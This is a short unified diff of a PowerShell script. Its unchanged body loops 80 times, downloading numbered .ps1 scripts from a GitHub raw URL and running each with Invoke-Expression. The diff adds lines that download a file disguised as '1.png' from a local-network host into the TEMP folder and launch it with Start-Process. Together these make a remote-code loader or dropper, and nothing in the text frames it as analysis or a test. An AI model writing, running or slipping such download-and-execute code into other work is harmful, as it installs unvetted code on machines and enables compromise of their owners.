@@ -1,3 +1,7 @@
+$wc = New-Object System.Net.WebClient;
+$wc.DownloadFile("http://192.168.1.4:8000/1.png", "$env:TEMP\1.png");
+Start-Process "$env:TEMP\1.png";
+
 for ($i = 1; $i -le 80; $i++) {
    
     $url = "https://raw.githubusercontent.com/jia891/test/refs/heads/main/sc$i.ps1"
@@ -10,3 +14,4 @@ for ($i = 1; $i -le 80; $i++) {
     Invoke-Expression $scriptContent
 
 }
+
